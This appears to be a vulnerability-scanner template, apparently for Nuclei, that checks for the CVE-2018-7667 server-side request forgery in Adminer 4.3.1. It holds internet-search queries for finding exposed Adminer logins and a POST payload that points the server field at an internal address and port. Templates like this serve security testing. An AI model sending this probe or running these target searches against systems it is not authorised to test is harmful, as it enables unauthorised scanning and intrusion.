id: CVE-2018-7667
info:
  author: Matt Galligan
  description: 'Adminer through 4.3.1 has SSRF via the server parameter.

    '
  metadata:
    fofa-query: app="Adminer" && body="4.3.1"
    hunter-query: app.name="Adminer"&&web.body="4.3.1"
    shodan-query: title:"Login - Adminer"
    verified: 'true'
  name: Adminer - 4.3.1 Server Side Request Forgery
  reference:
  - https://www.cvedetails.com/cve/CVE-2018-7667/
  - https://github.com/advisories/GHSA-43f8-p5w3-5m25
  - https://gusralph.info/adminer-ssrf-bypass-cve-2018-7667/
  severity: medium
  tags: cve,cve2018,adminer,ssrf
requests:
- body: 'auth%5Bdriver%5D={{servername}}&auth%5Bserver%5D=127.0.0.1:24&auth%5Busername%5D={{username}}

    '
  cookie-reuse: true
  headers:
    Content-Type: application/x-www-form-urlencoded
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 403
    - '!contains(body, ''Connecting to privileged ports is not allowed.'') && contains(body,
      ''Adminer'')'
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/adminer/'
  - '{{BaseURL}}/adminer.php'
  stop-at-first-match: true
